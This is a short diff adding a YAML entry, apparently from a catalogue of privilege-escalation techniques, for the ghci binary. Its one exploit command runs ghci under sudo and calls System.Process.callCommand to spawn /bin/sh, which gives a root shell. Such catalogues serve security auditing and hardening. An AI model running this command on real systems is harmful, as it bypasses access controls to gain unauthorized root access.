@@ -1,0 +1,4 @@
+name: ghci
+binary_path: /usr/bin/ghci
+exploit_cmds:
+- sudo /usr/bin/ghci && System.Process.callCommand "/bin/sh"
